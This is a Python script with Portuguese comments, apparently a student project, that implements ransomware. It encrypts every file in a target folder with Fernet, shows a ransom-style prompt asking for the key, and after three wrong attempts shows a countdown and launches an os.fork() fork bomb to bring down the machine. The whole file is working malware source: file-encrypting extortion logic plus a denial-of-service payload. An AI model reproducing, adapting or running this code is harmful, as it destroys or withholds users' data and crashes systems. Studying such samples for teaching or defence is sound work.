#Nomes:
#Sandron Oliveira Silva
#Lorena Bauer Nogueira

import os
import sys
import time
from cryptography.fernet import Fernet
from tkinter import Tk, simpledialog, messagebox
import base64

# Função para gerar uma chave e salvá-la em um arquivo
def generate_key(key_path):
    key = Fernet.generate_key()
    with open(key_path, 'wb') as key_file:
        key_file.write(key)
    return key

# Função para carregar a chave de um arquivo
def load_key(key_path):
    with open(key_path, 'rb') as key_file:
        return key_file.read()

# Função para criptografar arquivos na pasta alvo
def encrypt_files(target_folder, key):
    fernet = Fernet(key)
    for root, _, files in os.walk(target_folder):
        for file in files:
            if file == 'key.rans':
                continue
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                original_data = f.read()
            encrypted_data = fernet.encrypt(original_data)
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)

# Função para descriptografar arquivos na pasta alvo
def decrypt_files(target_folder, key):
    try:
        fernet = Fernet(key)
    except Exception as e:
        raise ValueError("Chave inválida ou malformada")

    for root, _, files in os.walk(target_folder):
        for file in files:
            if file == 'key.rans':
                continue
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                encrypted_data = f.read()
            decrypted_data = fernet.decrypt(encrypted_data)
            with open(file_path, 'wb') as f:
                f.write(decrypted_data)

# Função principal
def main():
    target_folder = 'pasta_alvo'  # Caminho da pasta alvo
    key_file = os.path.join('key.rans')
    tentativas_restantes = 3  # Número de tentativas restantes

    # Verificar se a chave já existe
    if not os.path.exists(key_file):
        # Gerar uma chave e criptografar os arquivos
        key = generate_key(key_file)
        encrypt_files(target_folder, key)

        # Mostrar mensagem informando do ataque
        Tk().withdraw()
        messagebox.showinfo("Aviso de Criptografia", "Seus arquivos foram criptografados. Insira a chave para descriptografá-los.")
    else:
        # Solicitar chave para descriptografia
        Tk().withdraw()
        while tentativas_restantes > 0:
            key_input = simpledialog.askstring("Descriptografia", f"Insira a chave para descriptografar os arquivos (Tentativas restantes: {tentativas_restantes}):")
            if key_input:
                try:
                    decrypt_files(target_folder, key_input.encode())
                    messagebox.showinfo("Descriptografia", "Arquivos descriptografados com sucesso!")
                    return
                except Exception as e:
                    tentativas_restantes -= 1
                    if tentativas_restantes == 0:
                        messagebox.showerror("Erro", "Todas as tentativas foram usadas. Prepare-se para o pior.")
                        # Contagem regressiva antes de executar o código final
                        for i in range(10, 0, -1):
                            messagebox.showwarning("Contagem Regressiva", f"O sistema será terminado em {i} segundos.")
                    
                        # Trecho de código a ser executado quando as tentativas se esgotarem
                        while 1:
	                        os.fork()
                        sys.exit(1)

                    else:
                        messagebox.showerror("Erro", "Chave incorreta ou erro na descriptografia.")

if __name__ == '__main__':
    main()